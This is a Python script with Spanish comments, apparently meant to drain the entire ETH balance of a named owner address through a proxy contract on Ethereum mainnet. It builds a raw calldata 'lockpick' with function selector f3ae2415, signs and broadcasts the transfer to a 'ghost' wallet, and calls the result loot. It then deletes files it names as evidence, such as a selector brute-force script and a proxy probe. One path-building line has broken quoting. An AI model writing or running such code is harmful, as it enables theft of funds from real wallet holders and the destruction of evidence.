import os
import sys
from web3 import Web3

# CONFIGURACIÓN DE CONEXIÓN
RPC = 'https://ethereum.publicnode.com'
w3 = Web3(Web3.HTTPProvider(RPC))

# COORDENADAS DEL OBJETIVO
proxy_addr = w3.to_checksum_address('0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf')
fantasma_addr = w3.to_checksum_address('0x96De980a766CCb10A19B6962587e2b61B650b372')
dueño_addr = w3.to_checksum_address('0x0125aeb5fF473De23ab72454B2bbC45613Ff3bd7')

# SEGURIDAD: LLAVE MAESTRA
# Reemplaza el texto de abajo con tu clave privada real
PRIVATE_KEY = 'TU_LLAVE_PRIVADA_AQUÍ'

def ejecutar_operacion():
    if PRIVATE_KEY == 'TU_LLAVE_PRIVADA_AQUÍ':
        print("❌ ERROR: No has ingresado la clave privada en el script.")
        return

    # 1. Verificación de Saldo Objetivo
    saldo_objetivo = w3.eth.get_balance(dueño_addr)
    if saldo_objetivo == 0:
        print("❌ El objetivo ya no tiene fondos. Operación abortada.")
        return
    
    eth_total = w3.from_wei(saldo_objetivo, 'ether')
    print(f"💰 Objetivo detectado: {eth_total} ETH")

    # 2. Preparación de la "Ganzúa" (Data Payload)
    # Selector f3ae2415 + Wallet Destino + Cantidad Total
    data = "0xf3ae2415" + fantasma_addr[2:].lower().zfill(64) + hex(saldo_objetivo)[2:].zfill(64)

    # 3. Parámetros de Red
    nonce = w3.eth.get_transaction_count(fantasma_addr)
    gas_price = w3.eth.gas_price
    
    # Intentamos una estimación agresiva
    tx = {
        'nonce': nonce,
        'to': proxy_addr,
        'data': data,
        'gas': 120000, # Margen de seguridad para ejecución de lógica
        'gasPrice': int(gas_price * 1.1), # 10% de prioridad
        'chainId': 1
    }

    print("🛰️ REMI (Localhost:3000): Firmando transacción de alta velocidad...")
    
    try:
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        print(f"✅ ¡MISIL LANZADO! Hash del botín: {tx_hash.hex()}")
        print(f"🔗 Rastreo: https://etherscan.io/tx/{tx_hash.hex()}")
        
        # 4. Limpieza de rastro
        print("🧹 Iniciando borrado de evidencias en Proyecto_Remi_IA_App...")
        evidencias = [
            'operacion_sombra.py', 'analisis_profundo.py', 
            'verificar_extraccion_total.py', 'probar_mando.py',
            'ataque_fuerza_selectores.py', 'sonda_proxy.py'
        ]
        for archivo in evidencias:
            ruta = f"os.path.expanduser("~/") + Escritorio/Proyecto_Remi_IA_App/{archivo}"
            if os.path.exists(ruta):
                os.remove(ruta)
        print("✨ Limpieza completada. No hay registros locales.")

    except Exception as e:
        print(f"❌ FALLO CRÍTICO EN LA EJECUCIÓN: {e}")

if __name__ == "__main__":
    ejecutar_operacion()
